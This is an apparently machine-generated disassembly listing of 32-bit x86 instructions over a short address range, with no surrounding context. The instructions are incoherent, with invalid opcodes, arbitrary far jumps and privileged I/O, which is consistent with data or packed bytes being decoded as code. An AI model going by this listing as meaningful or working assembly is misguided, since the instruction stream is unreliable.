  41b9d0:	test   BYTE PTR [edx+0x15665f87],bh
  41b9d6:	xor    cl,BYTE PTR [edi-0x1f]
  41b9d9:	pusha  
  41b9da:	inc    esp
  41b9db:	call   0x404:0xce5efb4b
  41b9e2:	cmp    al,0x2c
  41b9e4:	push   eax
  41b9e5:	jle    0x41b9d4
  41b9e7:	sub    eax,0x1caf8b0a
  41b9ec:	bound  esi,QWORD PTR [edx+0x60]
  41b9ef:	dec    ecx
  41b9f0:	ficom  WORD PTR [edi]
  41b9f2:	rol    bl,0x68
  41b9f5:	daa    
  41b9f6:	int3   
  41b9f7:	bound  esp,QWORD PTR [edi-0x939ae2e]
  41b9fd:	(bad)  [edx]
  41b9ff:	add    al,0x75
  41ba01:	out    dx,eax
  41ba02:	jmp    0xfe86:0x8bec74c9
  41ba09:	inc    edi
  41ba0a:	push   ecx
  41ba0b:	xor    DWORD PTR [ebp-0x694eb536],esp
  41ba11:	iret   
  41ba12:	add    BYTE PTR [ecx+edi*1-0x12f9c1e5],dh
  41ba19:	pushf  
  41ba1a:	xor    al,cl
  41ba1c:	repz call 0xdcf456bc
  41ba22:	dec    ebp
  41ba23:	xor    ecx,edi
  41ba25:	ret    
  41ba26:	cmp    edx,DWORD PTR [eax+0x32c55df]
  41ba2c:	es push ss
  41ba2e:	test   BYTE PTR [ecx+0x73a694dd],al
  41ba34:	mov    eax,ds:0x7ba16008
  41ba39:	mov    al,ds:0x7cca249
  41ba3e:	je     0x41ba5f
  41ba40:	jg     0x41ba1d
  41ba42:	enter  0x6eff,0x2b
  41ba46:	test   DWORD PTR [edi-0x39],edi
  41ba49:	popw   ds
  41ba4b:	fidivr WORD PTR [eax-0x74f8f04b]
  41ba51:	cmp    DWORD PTR [esi+0x7f],ecx
  41ba54:	adc    esi,0x7af8e7dc
  41ba5a:	clc    
  41ba5b:	daa    
  41ba5c:	sti    
  41ba5d:	and    ch,BYTE PTR [eax]
  41ba5f:	dec    eax
  41ba60:	mov    dl,0x25
  41ba62:	sub    bh,bl
  41ba64:	xchg   ecx,eax
  41ba65:	xchg   edi,eax
  41ba66:	lods   eax,DWORD PTR ds:[esi]
  41ba67:	int3   
  41ba68:	pop    ebp
  41ba69:	jae    0x41ba67
  41ba6b:	(bad)  
  41ba6c:	ds in  al,0x15
  41ba6f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ba70:	mov    ch,0xdb
  41ba72:	into   
  41ba73:	lods   eax,DWORD PTR ds:[esi]
  41ba74:	shl    edx,cl
  41ba76:	aas    
  41ba77:	loopne 0x41ba80
  41ba79:	inc    ebp
  41ba7a:	adc    DWORD PTR [ebx+0x3c],esp
  41ba7d:	cld    
  41ba7e:	inc    ebx
  41ba7f:	inc    esp
  41ba80:	stos   DWORD PTR es:[edi],eax
  41ba81:	je     0x41ba99
  41ba83:	stc    
  41ba84:	add    ch,al
  41ba86:	xchg   BYTE PTR [eax-0x7db41998],ah
  41ba8c:	outs   dx,DWORD PTR ds:[esi]
  41ba8d:	xchg   ebp,eax
  41ba8e:	add    al,0xb8
  41ba90:	mov    esp,0x29b224c0
  41ba95:	fistp  WORD PTR [edi+eax*2]
  41ba98:	std    
  41ba99:	adc    esi,esi
  41ba9b:	sti    
  41ba9c:	jmp    0x41ba66
  41ba9e:	arpl   WORD PTR [esi],si
  41baa0:	cli    
  41baa1:	mov    ecx,0xdf2b2afd
  41baa6:	out    dx,al
  41baa7:	sahf   
  41baa8:	and    ch,BYTE PTR [esi+0x14546670]
  41baae:	push   ss
  41baaf:	inc    esp
  41bab0:	dec    ebx
  41bab1:	inc    esi
  41bab2:	and    al,BYTE PTR [eax*4-0x4d34d4b2]
  41bab9:	pop    edx
  41baba:	lods   al,BYTE PTR ds:[esi]
  41babb:	sahf   
  41babc:	mov    DWORD PTR [eax+ecx*2],0x908fd0d5
  41bac3:	inc    esi
  41bac4:	popf   
  41bac5:	in     al,0x1e
  41bac7:	sbb    BYTE PTR [edx-0xf61a199],al
  41bacd:	mov    esi,0x7492a318
  41bad2:	push   DWORD PTR [edx-0x2536aea4]
  41bad8:	and    eax,0xae1a8ccc
  41badd:	ss mov ch,0xcf
  41bae0:	les    esp,FWORD PTR [esi-0x3d027b36]
  41bae6:	mov    al,ds:0x26059cdc
  41baeb:	or     BYTE PTR ds:[esi+0x38c8e524],0xb4
  41baf3:	mov    BYTE PTR [edi],dl
  41baf5:	xor    al,0xb6
  41baf7:	mov    bh,0x92
  41baf9:	inc    ebx
  41bafa:	test   al,bh
  41bafc:	and    eax,0x9e1fb290
  41bb01:	mov    ecx,0x18ba08ca
  41bb06:	dec    ebx
  41bb07:	adc    BYTE PTR [eax+edx*1],al
  41bb0a:	fild   WORD PTR [edi-0x6]
  41bb0d:	retf   0x93c7
  41bb10:	xor    DWORD PTR [ebx-0x19448b03],edi
  41bb16:	pushf  
  41bb17:	pop    esp
  41bb18:	cdq    
  41bb19:	pop    eax
  41bb1a:	jnp    0x41bb60
  41bb1c:	xor    esp,edx
  41bb1e:	xchg   esi,eax
  41bb1f:	mov    ebp,DWORD PTR [ebx+0x5d758488]
  41bb25:	loop   0x41bae7
  41bb27:	xchg   BYTE PTR [esi+0x560040db],bl
  41bb2d:	stos   DWORD PTR es:[edi],eax
  41bb2e:	or     BYTE PTR [esi],ah
  41bb30:	pop    ebp
  41bb31:	mov    cl,0x70
  41bb33:	or     eax,0x9b216b4b
  41bb38:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bb39:	jg     0x41bb43
  41bb3b:	cmp    eax,0xbb4f0052
  41bb40:	xor    eax,0x95640277
  41bb45:	pop    esp
  41bb46:	rol    BYTE PTR [eax-0x53],0xa
  41bb4a:	mov    dh,0x8f
  41bb4d:	xor    al,0x67
  41bb4f:	leave  
  41bb50:	test   BYTE PTR [esi-0x6c8532f9],ah
  41bb56:	aad    0x6e
  41bb58:	clc    
  41bb59:	loopne 0x41bb8c
  41bb5b:	in     eax,0xbf
  41bb5d:	cli    
  41bb5e:	cwde   
  41bb5f:	mov    ecx,0xc745e516
  41bb64:	(bad)  
  41bb65:	xchg   esp,eax
  41bb66:	and    BYTE PTR [eax+0x51],0xaa
  41bb6a:	scas   eax,DWORD PTR es:[edi]
  41bb6b:	dec    ebx
  41bb6c:	and    al,0xb8
  41bb6e:	push   0xffffffed
  41bb70:	fadd   st,st(3)
  41bb72:	jl     0x41bb7e
  41bb74:	xchg   edi,eax
  41bb75:	loope  0x41bbaa
  41bb77:	bswap  edx
  41bb79:	or     cl,al
  41bb7b:	cli    
  41bb7c:	adc    dh,al
  41bb7e:	jmp    0x7305ee7
  41bb83:	or     DWORD PTR [eax-0x6d657724],eax
  41bb89:	xor    eax,0x2b2cff89
  41bb8e:	jmp    0x41bb58
  41bb90:	shr    edx,0xa1
  41bb93:	pop    esi
  41bb94:	lds    esi,FWORD PTR [ebx+eiz*4]
  41bb97:	xchg   BYTE PTR [ecx+0x48a61e16],bl
  41bb9d:	pusha  
  41bb9e:	mov    bl,0x28
  41bba0:	add    al,0x14
  41bba2:	pop    ecx
  41bba3:	pop    esi
  41bba4:	retf   
  41bba5:	jecxz  0x41bb95
  41bba7:	rol    BYTE PTR [edi+0xd7ba921],cl
  41bbad:	out    dx,al
  41bbae:	and    al,0xee
  41bbb0:	int3   
  41bbb1:	pop    edi
  41bbb2:	add    edx,ebp
  41bbb4:	xor    BYTE PTR [esi+eax*8],bh
  41bbb7:	sti    
  41bbb8:	outs   dx,BYTE PTR ds:[esi]
  41bbb9:	int3   
  41bbba:	cld    
  41bbbb:	test   BYTE PTR [eax-0x7c37907f],ch
  41bbc1:	sub    eax,0x5956d954
  41bbc6:	jne    0x41bbd6
  41bbc8:	cs pop ebx
  41bbca:	(bad)  
  41bbcb:	pop    ss
  41bbcc:	popf   
  41bbcd:	leave  
  41bbce:	sahf   
  41bbcf:	sbb    BYTE PTR [edx],dh
  41bbd1:	lods   eax,DWORD PTR ds:[esi]
  41bbd2:	inc    esi
  41bbd3:	and    esi,0xffffff9e
  41bbd6:	fnstsw WORD PTR [esi+0x10590b7c]
  41bbdc:	and    ah,BYTE PTR [edi-0x7e]
  41bbdf:	push   ebp
  41bbe0:	cmp    BYTE PTR [ebp+0x49],bh
  41bbe3:	jbe    0x41bbd4
  41bbe5:	sub    BYTE PTR [edx],ch
  41bbe7:	jecxz  0x41bc5c
  41bbe9:	rcl    BYTE PTR [eax+0x5777b66a],0x9
  41bbf0:	sar    DWORD PTR [eax+0x356f821f],0xec
  41bbf7:	mov    bl,0xaf
  41bbf9:	dec    eax
  41bbfa:	xchg   bh,bh
  41bbfc:	(bad)  
  41bbfd:	fisubr WORD PTR es:0xd398885c
  41bc04:	push   eax
  41bc05:	je     0x41bbb9
  41bc07:	sub    BYTE PTR [ebp+0x79f29976],dh
  41bc0d:	adc    eax,0x5a1a06a3
  41bc12:	(bad)  
  41bc13:	or     esp,DWORD PTR [edi-0x1f]
  41bc16:	xor    DWORD PTR [ebp+0xb],edx
  41bc19:	hlt    
  41bc1a:	jmp    0x6442:0xa6fd184f
  41bc21:	call   0x25c7:0x4699e988
  41bc28:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bc29:	ss sub cl,dh
  41bc2c:	sbb    esi,DWORD PTR [edx]
  41bc2e:	(bad)  
  41bc2f:	stc    
  41bc30:	adc    esi,DWORD PTR [eax+0x7]
  41bc33:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bc34:	std    
  41bc35:	pop    eax
  41bc36:	push   ecx
  41bc37:	mov    eax,ds:0xd5fbe125
  41bc3c:	es std 
  41bc3e:	mov    eax,0x105de725
  41bc43:	leave  
  41bc44:	push   esp
  41bc45:	and    esi,DWORD PTR [esi+ebx*2]
  41bc48:	cmp    al,0xa1
  41bc4a:	out    0x6b,al
  41bc4c:	dec    ebx
  41bc4d:	xchg   ebp,eax
  41bc4e:	dec    ebx
  41bc4f:	mov    al,0x9e
  41bc51:	dec    esi
  41bc52:	xchg   DWORD PTR [edx-0x6f],edi
  41bc55:	adc    DWORD PTR ds:0x208228bf,edi
  41bc5b:	nop
  41bc5c:	popf   
  41bc5d:	test   eax,0x9fd95d09
  41bc62:	mov    al,0xfa
  41bc64:	test   al,0xd2
  41bc66:	into   
  41bc67:	mov    bl,0x3c
  41bc69:	dec    edx
  41bc6a:	fsubr  QWORD PTR [edi+0x724240d7]
  41bc70:	aas    
  41bc71:	mov    esi,0xc9c7f013
  41bc76:	js     0x41bcaf
  41bc78:	mov    bl,BYTE PTR [ebx-0x1f]
  41bc7b:	(bad)  
  41bc7c:	enter  0x83c2,0x18
  41bc80:	xor    esp,ebx
  41bc82:	jae    0x41bc54
  41bc84:	loope  0x41bcf5
  41bc86:	retf   0xdbcb
  41bc89:	pop    ss
  41bc8a:	mov    al,0xb1
  41bc8c:	dec    ebp
  41bc8d:	mov    eax,ds:0x251b91a6
  41bc92:	imul   BYTE PTR [edi-0x3751e3f1]
  41bc98:	pushf  
  41bc99:	std    
  41bc9a:	adc    DWORD PTR [ecx-0x61],ebp
  41bc9d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bc9e:	pushf  
  41bc9f:	(bad)  
  41bca0:	std    
  41bca1:	sub    dh,BYTE PTR [esi-0x8176c39]
  41bca7:	fsub   QWORD PTR [eax-0x45]
  41bcaa:	adc    al,0x63
  41bcac:	adc    eax,0x739f3c7
  41bcb1:	mov    dh,dl
  41bcb3:	mov    ecx,0xfc5514e
  41bcb8:	fisubr WORD PTR [ebx+0x52bf5cb7]
  41bcbe:	retf   
  41bcbf:	adc    ch,bh
  41bcc1:	ja     0x41bcb8
  41bcc3:	pusha  
  41bcc4:	cs inc ecx
  41bcc6:	jae    0x41bd31
  41bcc8:	mov    ds:0x7103fe49,al
  41bccd:	fiadd  DWORD PTR [ebx-0x1991676d]
  41bcd3:	in     eax,0x4a
  41bcd5:	inc    eax
  41bcd6:	call   0x9ee9:0x48565953
  41bcdd:	arpl   ax,si
  41bcdf:	inc    eax
  41bce0:	out    dx,eax
  41bce1:	add    bh,ch
  41bce3:	push   es
  41bce4:	push   DWORD PTR [ebx-0x5c]
  41bce7:	test   al,0xcb
  41bce9:	popf   
  41bcea:	sbb    DWORD PTR [edx],ebx
  41bcec:	add    eax,0x348a4a6b
  41bcf1:	rol    DWORD PTR [ebx+0x5ab213ba],1
  41bcf7:	mov    edi,0xd03cecc
  41bcfc:	inc    edi
  41bcfd:	icebp  
  41bcfe:	repnz add eax,0x4ac8e86b
  41bd04:	xchg   ebp,eax
  41bd05:	cmp    BYTE PTR [esi+0xc],0xea
  41bd09:	xor    edx,esp
  41bd0b:	pop    eax
  41bd0c:	or     BYTE PTR [ebx-0x23],dl
  41bd0f:	inc    esi
  41bd10:	sbb    eax,0x88fdae2b
  41bd15:	neg    BYTE PTR [eax]
  41bd17:	or     bh,BYTE PTR [edi-0x785cd942]
  41bd1d:	cld    
  41bd1e:	aas    
  41bd1f:	sbb    ah,BYTE PTR [ebx+edi*8+0x72]
  41bd23:	(bad)  
  41bd24:	loopne 0x41bd14
  41bd26:	or     bh,cl
  41bd28:	test   BYTE PTR [bx+si],cl
  41bd2b:	jns    0x41bd19
  41bd2d:	(bad)  
  41bd2e:	out    0x80,al
  41bd30:	mov    bl,0x58
  41bd32:	bound  esp,QWORD PTR [edi+0x7a6bc8ab]
  41bd38:	sub    edi,edi
  41bd3a:	int    0x81
  41bd3c:	in     eax,dx
  41bd3d:	jo     0x41bd06
  41bd3f:	xor    al,0xd0
  41bd41:	test   eax,0xc082b250
  41bd46:	addr16 daa 
  41bd48:	inc    esi
  41bd49:	out    dx,al
  41bd4a:	mov    esi,0x4c7c4f8c
  41bd4f:	ret    0xd316
  41bd52:	sahf   
  41bd53:	mov    al,ds:0x78914d
  41bd58:	pop    ss
  41bd59:	inc    esi
  41bd5a:	call   DWORD PTR [edx+0x1c28f728]
  41bd60:	mov    eax,0xd85de0a3
  41bd65:	sbb    esp,DWORD PTR [eax-0x5]
  41bd68:	in     al,dx
  41bd69:	cmp    bh,BYTE PTR [ebx+esi*2]
  41bd6c:	fist   WORD PTR [ebx+ecx*1-0x9b4b112]
  41bd73:	push   esi
  41bd74:	enter  0x4131,0x75
  41bd78:	shr    edx,1
  41bd7a:	add    eax,0x83d2c6d1
  41bd7f:	mov    fs,WORD PTR [edi]
  41bd81:	jmp    0xe10d:0xfcf8b73e
  41bd88:	mov    ah,0x99
  41bd8a:	out    0x56,eax
  41bd8c:	xor    al,0x4f
  41bd8e:	sahf   
  41bd8f:	sbb    bl,ch
  41bd91:	dec    edi
  41bd92:	cmp    eax,0xcf905cb
  41bd97:	mov    ch,0x44
  41bd99:	scas   al,BYTE PTR es:[edi]
  41bd9a:	lock (bad) 
  41bd9c:	cmp    BYTE PTR [esi-0x44],bh
  41bd9f:	out    dx,eax
  41bda0:	push   ss
  41bda1:	sahf   
  41bda2:	pop    ss
  41bda3:	sbb    edx,DWORD PTR [ecx+0x1f]
  41bda6:	adc    edi,DWORD PTR [eax+0x4c]
  41bda9:	jno    0x41bdc1
  41bdab:	fldln2 
  41bdad:	dec    ebx
  41bdae:	dec    ebp
  41bdaf:	jbe    0x41bdb9
  41bdb1:	inc    ebp
  41bdb2:	mov    al,0x79
  41bdb4:	sub    ecx,eax
  41bdb6:	jbe    0x41be26
  41bdb8:	or     ebp,esp
  41bdba:	mov    dh,0x3d
  41bdbc:	push   ebx
  41bdbd:	test   eax,0xb68990c2
  41bdc2:	stos   DWORD PTR es:[edi],eax
  41bdc3:	or     dl,BYTE PTR [ebp-0x45b99eab]
  41bdc9:	js     0x41bdee
  41bdcb:	cmp    eax,0xdf9b3d5b
  41bdd0:	fmul   DWORD PTR [esi-0x33]
  41bdd3:	add    eax,DWORD PTR [ebx-0x6cbee14a]
  41bdd9:	fnstenv [ecx]
  41bddb:	ins    BYTE PTR es:[edi],dx
  41bddc:	xchg   ecx,eax
  41bddd:	xchg   esp,eax
  41bdde:	xor    DWORD PTR es:[edi-0x59293269],0xffffffd0
  41bde6:	aam    0x7f
  41bde8:	xor    al,0x87
  41bdea:	mov    BYTE PTR [ebp+0x7d],bh
  41bded:	dec    esp
  41bdee:	(bad)  
  41bdef:	je     0x41be16
  41bdf1:	ins    DWORD PTR es:[edi],dx
  41bdf2:	les    ebp,FWORD PTR [ecx+0x49]
  41bdf5:	mov    esi,DWORD PTR [ebx+0x73]
  41bdf8:	jo     0x41bdec
  41bdfa:	test   ecx,edi
  41bdfc:	daa    
  41bdfd:	mov    al,ds:0xe5b2a4c7
  41be02:	push   es
  41be03:	repnz (bad) 
  41be05:	push   0xffffffd7
  41be07:	call   0xbda835a3
  41be0c:	enter  0xa124,0x5c
  41be10:	mov    esp,0xd5384c22
  41be15:	pop    ebp
  41be16:	inc    esp
  41be17:	sbb    ah,BYTE PTR [eax+0x3e]
  41be1a:	jmp    0x98fdfcac
  41be1f:	push   edx
  41be20:	dec    edi
  41be21:	cmp    DWORD PTR [edi],esi
  41be23:	jl     0x41be25
  41be25:	adc    eax,0xd5074cf5
  41be2a:	clc    
  41be2b:	push   ss
  41be2c:	push   es
  41be2d:	sub    cl,BYTE PTR [esi+0x6f]
  41be30:	pop    ss
  41be31:	adc    DWORD PTR [ecx+0x8],0xffffffdd
  41be35:	lahf   
  41be36:	nop
  41be37:	cwde   
  41be38:	xchg   esi,eax
  41be39:	shl    DWORD PTR [ebp-0x71c59d4f],0xe9
  41be40:	push   edx
  41be41:	push   edi
  41be42:	mov    ebx,0x78892766
  41be47:	je     0x41be16
  41be49:	push   ebp
  41be4a:	xor    ebx,DWORD PTR [ecx+edx*2]
  41be4d:	push   eax
  41be4e:	call   0xb5e3:0xd75d93ee
  41be55:	mov    ah,0x5e
  41be57:	mov    ebx,0x27be0108
  41be5c:	push   es
  41be5d:	fnstenv [eax-0x674f8f51]
  41be63:	adc    al,0x54
  41be65:	mov    WORD PTR [edi-0x6d],fs
  41be68:	or     DWORD PTR [ebx],ebp
  41be6a:	pop    ds
  41be6b:	shl    DWORD PTR [ecx+0x2f],1
  41be6e:	outs   dx,DWORD PTR ds:[esi]
  41be6f:	jge    0x41be97
  41be71:	adc    eax,0x685e1b91
  41be76:	loopne 0x41be1b
  41be78:	imul   edi,ebx,0x15
  41be7b:	sub    al,0x39
  41be7d:	add    DWORD PTR [ecx+0x3973c55e],esi
  41be83:	jbe    0x41befa
  41be85:	push   0x2a57218e
  41be8a:	inc    ebx
  41be8b:	xor    al,0x1a
  41be8d:	es or  eax,0xc7d05e65
  41be93:	subps  xmm2,XMMWORD PTR [ebp+0x583584a7]
  41be9a:	enter  0x1c4f,0xa8
  41be9e:	fidiv  DWORD PTR [ecx]
  41bea0:	add    dh,BYTE PTR [ebp-0x5e75c04]
  41bea6:	or     edx,DWORD PTR [edi-0x2b]
  41bea9:	pop    esi
  41beaa:	add    esi,DWORD PTR [edi]
  41beac:	cld    
  41bead:	mov    ah,0x8a
  41beaf:	cdq    
  41beb0:	ss ret 0x2a95
  41beb4:	fs aaa 
  41beb6:	out    dx,eax
  41beb7:	sbb    al,0x5e
  41beb9:	sub    al,0x12
  41bebb:	call   0x44928ab
  41bec0:	nop
  41bec1:	cld    
  41bec2:	adc    eax,0xc372a367
  41bec7:	inc    esp
  41bec8:	mov    ecx,ebp
  41beca:	dec    ebx
  41becb:	jmp    0x5f73:0xa9d79b91
  41bed2:	repnz (bad) 
  41bed4:	ins    BYTE PTR es:[edi],dx
  41bed5:	cdq    
  41bed6:	jns    0x41bf06
  41bed8:	out    0x17,eax
  41beda:	add    eax,DWORD PTR [ecx]
  41bedc:	xchg   ebp,eax
  41bedd:	dec    edx
  41bede:	fwait
  41bedf:	outs   dx,BYTE PTR ds:[esi]
  41bee0:	mov    ds:0x96a3faec,eax
  41bee5:	push   es
  41bee6:	jg     0x41befc
  41bee8:	mov    ecx,0x849a6e91
  41beed:	(bad)  
  41beee:	fisubr WORD PTR [edi+0x6d71d6bb]
  41bef4:	adc    bh,ah
  41bef6:	aad    0xb6
  41bef8:	pushw  ss
  41befa:	xor    cl,BYTE PTR [edx+0x41357b9f]
  41bf00:	pop    esp
  41bf01:	pop    ebx
  41bf02:	cmp    ah,bl
  41bf04:	push   esp
  41bf05:	test   esp,ebx
  41bf07:	aam    0xe9
  41bf09:	dec    ecx
  41bf0a:	in     eax,dx
  41bf0b:	jae    0x41bf2d
  41bf0d:	pusha  
  41bf0e:	fstp   st(4)
  41bf10:	test   DWORD PTR [ebx+0x3d],0x12c8e3b8
  41bf17:	loope  0x41bf29
  41bf19:	shr    BYTE PTR [esi+0x11],1
  41bf1c:	ficom  DWORD PTR [edx+0x308462a5]
  41bf22:	rol    BYTE PTR [ebp+0x7f6f63a1],1
  41bf28:	mov    BYTE PTR [ebx],ch
  41bf2a:	rcl    DWORD PTR [ebp+0x6c772de6],1
  41bf30:	cmp    ecx,DWORD PTR [eax]
  41bf32:	std    
  41bf33:	mov    eax,ds:0x38713c3a
  41bf38:	xor    al,0x91
  41bf3a:	icebp  
  41bf3b:	(bad)  gs:[esi]
  41bf3e:	and    edi,edi
  41bf40:	add    edi,ecx
  41bf42:	div    ecx
  41bf44:	sub    dl,ch
  41bf46:	or     DWORD PTR [ebp+0x3849137f],ecx
  41bf4c:	mov    bl,0xf3
  41bf4e:	mov    dh,0x9d
  41bf50:	lds    edi,FWORD PTR [edi-0x56cf6d26]
  41bf56:	clc    
  41bf57:	in     al,0xae
  41bf59:	into   
  41bf5a:	push   eax
  41bf5b:	es inc ebx
  41bf5d:	push   eax
  41bf5e:	fdiv   st,st(3)
  41bf60:	rcr    DWORD PTR [edx+0xa],0xac
  41bf64:	adc    ebx,DWORD PTR [ebx+0x37]
  41bf67:	cmp    al,0x83
  41bf69:	jmp    0x41bf11
  41bf6b:	out    dx,al
  41bf6c:	xchg   ebp,eax
  41bf6d:	loop   0x41bf6a
  41bf6f:	int3   
  41bf70:	fwait
  41bf71:	xchg   ecx,eax
  41bf72:	push   cs
  41bf73:	loop   0x41bfb8
  41bf75:	add    al,0x88
  41bf77:	adc    al,0x7c
  41bf79:	inc    ecx
  41bf7a:	mov    ah,0x70
  41bf7c:	or     eax,0x9756b00f
  41bf81:	fnstcw WORD PTR [edi+0x3]
  41bf84:	fsubr  DWORD PTR [ebx-0x3a3c6cb5]
  41bf8a:	retf   
  41bf8b:	inc    esp
  41bf8c:	or     al,0xac
  41bf8e:	adc    al,0x33
  41bf90:	in     eax,0x5
  41bf92:	jg     0x41bf59
  41bf94:	imul   ebp,DWORD PTR [edi-0x5c],0x7013639d
  41bf9b:	jmp    0xc9a1:0xfdc851c8
  41bfa2:	fimul  DWORD PTR [ebp-0x3805d452]
  41bfa8:	icebp  
  41bfa9:	lea    esi,[ecx-0x62]
  41bfac:	shr    BYTE PTR [edx],1
  41bfae:	outs   dx,BYTE PTR ds:[esi]
  41bfaf:	adc    eax,0x1a7c9efb
  41bfb4:	lea    ebx,[ecx]
  41bfb6:	mov    ecx,0x258dc5e2
  41bfbb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bfbc:	pop    ecx
  41bfbd:	xchg   esp,eax
  41bfbe:	sbb    ebx,eax
  41bfc0:	inc    ebp
  41bfc1:	inc    esp
  41bfc2:	das    
  41bfc3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bfc4:	cmp    edi,DWORD PTR [esi-0x4329e0e0]
  41bfca:	push   edi
  41bfcb:	sti    
  41bfcc:	push   esp
  41bfcd:	loopne 0x41bf6c
  41bfcf:	cmc    
  41bfd0:	xor    eax,0x66b55cde
  41bfd5:	retf   
  41bfd6:	inc    ebp
  41bfd7:	ins    BYTE PTR es:[edi],dx
  41bfd8:	js     0x41bfa5
  41bfda:	mov    bh,0xa2
  41bfdc:	cmp    eax,0xa572eeb3
  41bfe1:	adc    al,bl
  41bfe3:	shr    esp,0x97
  41bfe6:	lahf   
  41bfe7:	cmova  edi,ebp
  41bfea:	add    eax,0xad31dd8a
  41bfef:	dec    eax
  41bff0:	call   0x1b98036e
  41bff5:	inc    ecx
  41bff6:	scas   al,BYTE PTR es:[edi]
  41bff7:	jnp    0x41c075
  41bff9:	nop
  41bffa:	push   ebx
  41bffb:	mov    ah,al
  41bffd:	int3   
  41bffe:	sub    edx,DWORD PTR [ecx+0x8]
  41c001:	push   edi
  41c002:	cmp    al,BYTE PTR [edi-0x54b03321]
  41c008:	xchg   esp,eax
  41c009:	ds repz push cs
  41c00c:	ror    DWORD PTR [eax-0x15],cl
  41c00f:	jle    0x41c00c
  41c011:	cli    
  41c012:	popf   
  41c013:	jge    0x41c075
  41c015:	cmp    edi,ecx
  41c017:	xchg   DWORD PTR [edi+ebp*8],edi
  41c01a:	pop    ebx
  41c01b:	loopne 0x41c02c
  41c01d:	pandn  mm1,QWORD PTR [edi+0x636920]
  41c024:	xor    cl,BYTE PTR [edi]
  41c026:	push   ss
  41c027:	and    eax,0xb79b983e
  41c02c:	push   cs
  41c02d:	or     al,0x1f
  41c02f:	call   0x71bb0119
  41c034:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c035:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c036:	or     BYTE PTR [ecx+0x2d0e4ff5],dl
  41c03c:	inc    ebx
  41c03d:	sar    BYTE PTR [ebx],1
  41c03f:	dec    ecx
  41c040:	sub    dl,BYTE PTR [edi]
  41c042:	icebp  
  41c043:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c044:	add    dl,BYTE PTR [ebp-0x2f0b9125]
  41c04a:	dec    ecx
  41c04b:	ja     0x41c09a
  41c04d:	dec    ebx
  41c04e:	push   ss
  41c04f:	out    dx,al
  41c050:	mov    WORD PTR [edi-0x33570562],es
  41c056:	inc    edx
  41c057:	lahf   
  41c058:	(bad)  
  41c05a:	cli    
  41c05b:	cwde   
  41c05c:	cmp    eax,0xa77dec3f
  41c061:	lods   eax,DWORD PTR ds:[esi]
  41c062:	adc    bl,BYTE PTR [ecx]
  41c064:	sti    
  41c065:	test   DWORD PTR [edi],edi
  41c067:	xchg   BYTE PTR [ebx*1-0x33556729],ah
  41c06e:	xchg   edi,eax
  41c06f:	xchg   edi,eax
  41c070:	push   esp
  41c071:	dec    eax
  41c072:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c073:	out    0x6b,eax
  41c075:	push   es
  41c076:	aad    0xbb
  41c078:	dec    esp
  41c079:	xchg   edx,eax
  41c07a:	mov    eax,ds:0x62bcc897
  41c07f:	stos   DWORD PTR es:[edi],eax
  41c080:	and    eax,0x5366a633
  41c085:	sbb    DWORD PTR [esi-0x55],esp
  41c088:	es jecxz 0x41c010
  41c08b:	jmp    0x41c0d6
  41c08d:	sbb    al,0x23
  41c08f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c090:	pop    ebp
  41c091:	xchg   ebp,eax
  41c092:	ins    DWORD PTR es:[edi],dx
  41c093:	jno    0x41c0b5
  41c095:	cmp    eax,0xc0cfb5a2
  41c09a:	jne    0x41c048
  41c09c:	mov    DWORD PTR [ecx+0x2cb5f899],esi
  41c0a2:	xchg   ebx,eax
  41c0a3:	fist   WORD PTR [edx-0x1e334b55]
  41c0a9:	imul   esi,DWORD PTR [edx],0xffffffc6
  41c0ac:	jbe    0x41c0dc
  41c0ae:	(bad)  
  41c0af:	xlat   BYTE PTR ds:[ebx]
  41c0b0:	xchg   ebx,eax
  41c0b1:	jmp    0x41c0f6
  41c0b3:	in     al,0xdb
  41c0b5:	ins    BYTE PTR es:[edi],dx
  41c0b6:	rcl    DWORD PTR [ecx-0x6d5e2e94],cl
  41c0bc:	or     eax,0x9f1c3fcc
  41c0c1:	add    DWORD PTR [edi+0x5],0x5071fa05
  41c0c8:	test   DWORD PTR ds:0x770bb131,edi
  41c0ce:	jbe    0x41c09a
  41c0d0:	push   esi
  41c0d1:	push   eax
  41c0d2:	aaa    
  41c0d3:	mov    esi,0xdbde706a
  41c0d8:	leave  
  41c0d9:	add    BYTE PTR [esi+0x3c],0x40
  41c0dd:	cld    
  41c0de:	cs jmp 0x5b70:0x85e75923
  41c0e6:	cmp    BYTE PTR [edx],cl
  41c0e8:	push   0xffffffa5
  41c0ea:	arpl   WORD PTR [ecx-0x51a6d7f4],sp
  41c0f0:	loope  0x41c14c
  41c0f2:	inc    esp
  41c0f3:	outs   dx,DWORD PTR ds:[esi]
  41c0f4:	and    DWORD PTR [ebp-0x5a],ecx
  41c0f7:	nop
  41c0f8:	mov    dl,0xef
  41c0fa:	pop    ebp
  41c0fb:	iret   
  41c0fc:	inc    eax
  41c0fd:	adc    al,0x82
  41c0ff:	(bad)  
  41c100:	jecxz  0x41c0d2
  41c102:	out    0x4a,eax
  41c104:	adc    ecx,DWORD PTR [ebx+edi*1+0x4d3d273e]
  41c10b:	sub    al,0x64
  41c10d:	mov    edx,0x55662dff
  41c112:	dec    eax
  41c113:	sub    edi,ecx
  41c115:	dec    edx
  41c116:	and    eax,0x35efa719
  41c11b:	pop    edi
  41c11c:	rcl    ah,0xa7
  41c11f:	fwait
  41c120:	lea    esp,[ecx]
  41c122:	js     0x41c178
  41c124:	jno    0x41c136
  41c126:	push   ebp
  41c127:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c128:	clc    
  41c129:	pop    edx
  41c12a:	mov    ecx,0xa06316bd
  41c12f:	cmp    BYTE PTR [esi-0x2c],ch
  41c132:	jb     0x41c13d
  41c134:	dec    ecx
  41c135:	retf   0xd18b
  41c138:	push   ss
  41c139:	das    
  41c13a:	mov    eax,0x4ac53545
  41c13f:	cmp    eax,0xf12d7260
